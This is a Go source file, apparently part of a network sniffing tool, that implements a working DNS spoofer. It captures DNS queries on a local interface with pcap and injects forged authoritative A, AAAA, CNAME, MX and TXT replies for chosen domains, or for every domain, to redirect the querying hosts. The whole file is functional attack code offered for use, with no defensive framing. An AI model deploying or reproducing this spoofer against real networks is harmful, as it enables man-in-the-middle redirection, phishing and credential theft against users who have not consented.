package spoof

import (
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/miekg/dns"
	"github.com/sirupsen/logrus"
	"github.com/whoamikiddie/gonetsniff/internal/interfaces"
)

// DNSMapping represents a DNS spoofing rule
type DNSMapping struct {
	Domain string
	Type   string // A, AAAA, CNAME, etc.
	Answer string
	TTL    uint32
}

// DNSSpooferConfig contains configuration for the DNS spoofer
type DNSSpooferConfig struct {
	Enabled     bool
	Interface   string
	Mappings    []DNSMapping
	AllDomains  bool // If true, spoof all domains with the same IP
	DefaultIP   string
	LogRequests bool
}

// DefaultDNSSpooferConfig returns default DNS spoofer configuration
func DefaultDNSSpooferConfig() DNSSpooferConfig {
	return DNSSpooferConfig{
		Enabled:     false,
		Interface:   "",
		Mappings:    []DNSMapping{},
		AllDomains:  false,
		DefaultIP:   "127.0.0.1",
		LogRequests: true,
	}
}

// DNSSpoofer performs DNS spoofing attacks
type DNSSpoofer struct {
	config   DNSSpooferConfig
	iface    interfaces.NetworkInterface
	handle   *pcap.Handle
	stopChan chan struct{}
	wg       sync.WaitGroup
}

// NewDNSSpoofer creates a new DNS spoofer
func NewDNSSpoofer(config DNSSpooferConfig, ifaces []interfaces.NetworkInterface) (*DNSSpoofer, error) {
	if !config.Enabled {
		return &DNSSpoofer{
			config:   config,
			stopChan: make(chan struct{}),
		}, nil
	}

	// Find the specified interface
	var iface interfaces.NetworkInterface
	ifaceFound := false
	for _, i := range ifaces {
		if i.Name == config.Interface {
			iface = i
			ifaceFound = true
			break
		}
	}

	if !ifaceFound {
		return nil, fmt.Errorf("interface %s not found", config.Interface)
	}

	return &DNSSpoofer{
		config:   config,
		iface:    iface,
		stopChan: make(chan struct{}),
	}, nil
}

// Start begins DNS spoofing
func (s *DNSSpoofer) Start() error {
	if !s.config.Enabled {
		logrus.Info("DNS spoofer is disabled")
		return nil
	}

	logrus.Infof("Starting DNS spoofer on interface %s", s.iface.Name)

	// Open the device for capturing
	handle, err := pcap.OpenLive(s.iface.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("failed to open interface %s: %v", s.iface.Name, err)
	}
	s.handle = handle

	// Set filter for DNS traffic
	if err := handle.SetBPFFilter("udp and port 53"); err != nil {
		return fmt.Errorf("failed to set BPF filter: %v", err)
	}

	// Start spoofing in a goroutine
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		s.spoof()
	}()

	return nil
}

// Stop stops DNS spoofing
func (s *DNSSpoofer) Stop() {
	if !s.config.Enabled {
		return
	}

	logrus.Info("Stopping DNS spoofer")
	close(s.stopChan)
	s.wg.Wait()

	// Close the handle
	if s.handle != nil {
		s.handle.Close()
	}
}

// spoof performs the DNS spoofing
func (s *DNSSpoofer) spoof() {
	// Create packet source
	packetSource := gopacket.NewPacketSource(s.handle, s.handle.LinkType())
	packetChan := packetSource.Packets()

	for {
		select {
		case <-s.stopChan:
			return
		case packet, ok := <-packetChan:
			if !ok {
				return
			}
			s.handlePacket(packet)
		}
	}
}

// handlePacket processes a DNS packet
func (s *DNSSpoofer) handlePacket(packet gopacket.Packet) {
	// Get Ethernet layer
	ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
	if ethernetLayer == nil {
		return
	}
	ethernet := ethernetLayer.(*layers.Ethernet)

	// Get IP layer
	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	if ipLayer == nil {
		return
	}
	ip := ipLayer.(*layers.IPv4)

	// Get UDP layer
	udpLayer := packet.Layer(layers.LayerTypeUDP)
	if udpLayer == nil {
		return
	}
	udp := udpLayer.(*layers.UDP)

	// Check if this is a DNS query (destination port 53)
	if udp.DstPort != 53 {
		return
	}

	// Get application layer
	applicationLayer := packet.ApplicationLayer()
	if applicationLayer == nil {
		return
	}

	// Parse DNS message
	msg := new(dns.Msg)
	if err := msg.Unpack(applicationLayer.Payload()); err != nil {
		return
	}

	// Check if this is a query
	if msg.Opcode != dns.OpcodeQuery {
		return
	}

	// Process each question
	for _, question := range msg.Question {
		// Log the request if enabled
		if s.config.LogRequests {
			logrus.Infof("[DNS Spoof] Query from %s: %s %s",
				ip.SrcIP, question.Name, dns.TypeToString[question.Qtype])
		}

		// Check if we should spoof this domain
		shouldSpoof, answer := s.shouldSpoof(question.Name, question.Qtype)
		if !shouldSpoof {
			continue
		}

		// Create a spoofed response
		response := s.createSpoofedResponse(msg, question, answer)

		// Send the spoofed response
		s.sendSpoofedResponse(ethernet.SrcMAC, ethernet.DstMAC, ip.DstIP, ip.SrcIP, udp.DstPort, udp.SrcPort, response)

		logrus.Infof("[DNS Spoof] Spoofed response for %s: %s -> %s",
			question.Name, dns.TypeToString[question.Qtype], answer)
	}
}

// shouldSpoof checks if a domain should be spoofed
func (s *DNSSpoofer) shouldSpoof(domain string, qtype uint16) (bool, string) {
	// Remove trailing dot
	domain = strings.TrimSuffix(domain, ".")

	// Check specific mappings
	for _, mapping := range s.config.Mappings {
		if strings.EqualFold(mapping.Domain, domain) && (mapping.Type == dns.TypeToString[qtype] || mapping.Type == "*") {
			return true, mapping.Answer
		}
	}

	// If AllDomains is enabled, spoof all domains with the default IP
	if s.config.AllDomains && (qtype == dns.TypeA || qtype == dns.TypeAAAA) {
		return true, s.config.DefaultIP
	}

	return false, ""
}

// createSpoofedResponse creates a spoofed DNS response
func (s *DNSSpoofer) createSpoofedResponse(query *dns.Msg, question dns.Question, answer string) []byte {
	// Create a new response message
	response := new(dns.Msg)
	response.SetReply(query)
	response.Authoritative = true
	response.RecursionAvailable = true

	// Create the answer section
	switch question.Qtype {
	case dns.TypeA:
		rr := &dns.A{
			Hdr: dns.RR_Header{
				Name:   question.Name,
				Rrtype: dns.TypeA,
				Class:  dns.ClassINET,
				Ttl:    300,
			},
			A: net.ParseIP(answer).To4(),
		}
		response.Answer = append(response.Answer, rr)

	case dns.TypeAAAA:
		rr := &dns.AAAA{
			Hdr: dns.RR_Header{
				Name:   question.Name,
				Rrtype: dns.TypeAAAA,
				Class:  dns.ClassINET,
				Ttl:    300,
			},
			AAAA: net.ParseIP(answer).To16(),
		}
		response.Answer = append(response.Answer, rr)

	case dns.TypeCNAME:
		rr := &dns.CNAME{
			Hdr: dns.RR_Header{
				Name:   question.Name,
				Rrtype: dns.TypeCNAME,
				Class:  dns.ClassINET,
				Ttl:    300,
			},
			Target: answer,
		}
		response.Answer = append(response.Answer, rr)

	case dns.TypeMX:
		rr := &dns.MX{
			Hdr: dns.RR_Header{
				Name:   question.Name,
				Rrtype: dns.TypeMX,
				Class:  dns.ClassINET,
				Ttl:    300,
			},
			Preference: 10,
			Mx:         answer,
		}
		response.Answer = append(response.Answer, rr)

	case dns.TypeTXT:
		rr := &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   question.Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    300,
			},
			Txt: []string{answer},
		}
		response.Answer = append(response.Answer, rr)
	}

	// Pack the response
	responseBytes, _ := response.Pack()
	return responseBytes
}

// sendSpoofedResponse sends a spoofed DNS response
func (s *DNSSpoofer) sendSpoofedResponse(srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP, srcPort, dstPort layers.UDPPort, dnsPayload []byte) {
	// Create Ethernet layer
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}

	// Create IP layer
	ip := layers.IPv4{
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    srcIP,
		DstIP:    dstIP,
	}

	// Create UDP layer
	udp := layers.UDP{
		SrcPort: srcPort,
		DstPort: dstPort,
	}
	udp.SetNetworkLayerForChecksum(&ip)

	// Create payload
	payload := gopacket.Payload(dnsPayload)

	// Serialize the packet
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &ip, &udp, payload); err != nil {
		logrus.Errorf("Failed to serialize DNS response: %v", err)
		return
	}

	// Send the packet
	if err := s.handle.WritePacketData(buf.Bytes()); err != nil {
		logrus.Errorf("Failed to send spoofed DNS response: %v", err)
		return
	}
}

// AddMapping adds a DNS mapping
func (s *DNSSpoofer) AddMapping(domain, recordType, answer string, ttl uint32) {
	s.config.Mappings = append(s.config.Mappings, DNSMapping{
		Domain: domain,
		Type:   recordType,
		Answer: answer,
		TTL:    ttl,
	})
}

// RemoveMapping removes a DNS mapping
func (s *DNSSpoofer) RemoveMapping(domain, recordType string) {
	for i, mapping := range s.config.Mappings {
		if mapping.Domain == domain && mapping.Type == recordType {
			// Remove the mapping
			s.config.Mappings = append(s.config.Mappings[:i], s.config.Mappings[i+1:]...)
			return
		}
	}
}

// ClearMappings removes all DNS mappings
func (s *DNSSpoofer) ClearMappings() {
	s.config.Mappings = []DNSMapping{}
}

// GetMappings returns all DNS mappings
func (s *DNSSpoofer) GetMappings() []DNSMapping {
	return s.config.Mappings
}
